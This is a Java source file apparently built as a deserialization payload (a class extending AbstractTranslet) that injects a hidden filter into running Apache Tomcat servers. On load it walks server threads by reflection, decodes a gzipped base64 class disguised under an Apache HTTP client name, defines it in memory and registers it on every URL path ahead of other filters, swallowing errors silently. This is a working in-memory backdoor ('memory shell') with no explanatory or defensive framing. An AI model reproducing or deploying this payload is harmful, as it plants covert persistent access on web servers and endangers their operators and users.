package com.example.frchannel.payload;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

public class ReportUtil extends AbstractTranslet {
    public String getUrlPattern() {
        return "/*";
    }

    public String getClassName() {
        return "org.apache.http.client.WhiteBlackListYcFilter";
    }

    public String getBase64String() throws IOException {
        return new String("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");
    }

    public ReportUtil() {
        try {
            List<Object> contexts = this.getContext();
            Iterator var2 = contexts.iterator();

            while(var2.hasNext()) {
                Object context = var2.next();
                Object filter = this.getFilter(context);
                this.addFilter(context, filter);
            }
        } catch (Exception var5) {
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        Object context = null;

        try {
            Thread[] var15 = threads;
            int var5 = threads.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                Thread thread = var15[var6];
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap childrenMap = (HashMap)getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    Iterator var9 = childrenMap.keySet().iterator();

                    while(var9.hasNext()) {
                        Object key = var9.next();
                        HashMap children = (HashMap)getFV(childrenMap.get(key), "children");
                        Iterator var12 = children.keySet().iterator();

                        while(var12.hasNext()) {
                            Object key1 = var12.next();
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }

                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                } else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext")) {
                        contexts.add(context);
                    }

                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                        contexts.add(context);
                    }
                }
            }

            return contexts;
        } catch (Exception var14) {
            Exception e = var14;
            throw new RuntimeException(e);
        }
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            filter = classLoader.loadClass(this.getClassName());
        } catch (Exception var9) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Throwable var8) {
            }
        }

        return filter;
    }

    public String getFilterName(String className) {
        if (className.contains(".")) {
            int lastDotIndex = className.lastIndexOf(".");
            return className.substring(lastDotIndex + 1);
        } else {
            return className;
        }
    }

    public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        ClassLoader catalinaLoader = this.getCatalinaLoader();
        String filterClassName = this.getClassName();
        String filterName = this.getFilterName(filterClassName);

        try {
            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterName}) != null) {
                return;
            }
        } catch (Exception var16) {
        }

        Object filterDef;
        Object filterMap;
        try {
            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
        } catch (Exception var15) {
            try {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            } catch (Exception var14) {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef", true, catalinaLoader).newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap", true, catalinaLoader).newInstance();
            }
        }

        try {
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});

            Constructor[] constructors;
            try {
                invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            } catch (Exception var12) {
                invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, catalinaLoader).getDeclaredConstructors();
            }

            try {
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception var11) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }

            constructors[0].setAccessible(true);
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map)getFV(context, "filterConfigs");
            filterConfigs.put(filterName, filterConfig);
        } catch (Exception var13) {
            Exception e = var13;
            e.printStackTrace();
        }

    }

    public ClassLoader getCatalinaLoader() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        ClassLoader catalinaLoader = null;

        for(int i = 0; i < threads.length; ++i) {
            if (threads[i].getName().contains("ContainerBackgroundProcessor")) {
                catalinaLoader = threads[i].getContextClassLoader();
                break;
            }
        }

        return catalinaLoader;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str));
        } catch (Exception var4) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str));
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();

        while(clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var4) {
                clazz = clazz.getSuperclass();
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var11) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var9) {
                    throw new RuntimeException(var9.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            }
        }
    }

    static {
        new ReportUtil();
    }
}
